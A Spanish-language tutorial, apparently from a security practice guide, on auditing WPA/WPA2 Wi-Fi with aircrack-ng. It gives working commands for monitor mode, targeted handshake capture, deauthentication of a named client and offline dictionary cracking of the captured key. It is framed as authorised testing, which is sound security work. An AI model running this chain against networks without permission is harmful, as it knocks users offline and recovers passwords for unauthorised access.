Captura WPA/WPA2

En una auditoría inalámbrica autorizada se busca inventariar los SSID, BSSID, canales, tipos de cifrado y potencia de señal. Cuando existen clientes asociados, se pueden aplicar técnicas de desautenticación controlada para intentar capturar un handshake WPA/WPA2 cuando el cliente vuelva a conectarse, con el objetivo de comprobar si la contraseña de la red Wi-Fi es robusta y resiste ataques de diccionario.

Preparar Interfaz

Para esta práctica uso una antena TP-Link AC1300 Archer T3U Plus. Antes de ponerla en modo monitor conviene comprobar que el sistema la detecta correctamente y localizar su interfaz inalámbrica, en este caso wlan0.

Instalar herramientas

sudo apt install aircrack-ng

Limpiar procesos

sudo airmon-ng check
sudo airmon-ng check kill

Iniciar modo monitor

# Usar el nombre de la antena que aparezca con ifconfig/ip a
sudo airmon-ng start wlan0

Descubrimiento

Con la interfaz en modo monitor, se listan las redes visibles y ocultas al alcance. De esta salida interesa quedarse con el BSSID, el canal, el cifrado y el ESSID de la red objetivo.

Escanear redes disponibles

sudo airodump-ng wlan0

Captura del handshake

Una vez elegido el objetivo, se fija el canal y el BSSID para guardar la captura en disco. En paralelo, si existe un cliente asociado y el alcance lo permite, se fuerza una reconexión mediante desautenticación para provocar el intercambio del handshake.

Capturar tráfico del objetivo

sudo airodump-ng -c 6 --bssid 9E:3E:63:1D:67:62 -w captura wlan0

Desautenticación controlada

sudo aireplay-ng -0 9 -a 9E:3E:63:1D:67:62 -c 4C:63:71:92:30:F1 wlan0

Ficheros generados

Airodump-ng genera varios ficheros de salida. Para el ataque con Aircrack-ng interesa principalmente el fichero .cap, que contiene la captura del handshake.

Ataque de diccionario

Cuando aparece el handshake, el archivo .cap puede usarse para probar un diccionario offline. Si la clave está en el diccionario, Aircrack-ng la recuperará; si no, el ataque fallará aunque el handshake sea válido.

Aircrack-ng

aircrack-ng -b 9E:3E:63:1D:67:62 -w rockyou.txt captura-01.cap

Limpieza

Detener modo monitor

airmon-ng stop wlan0
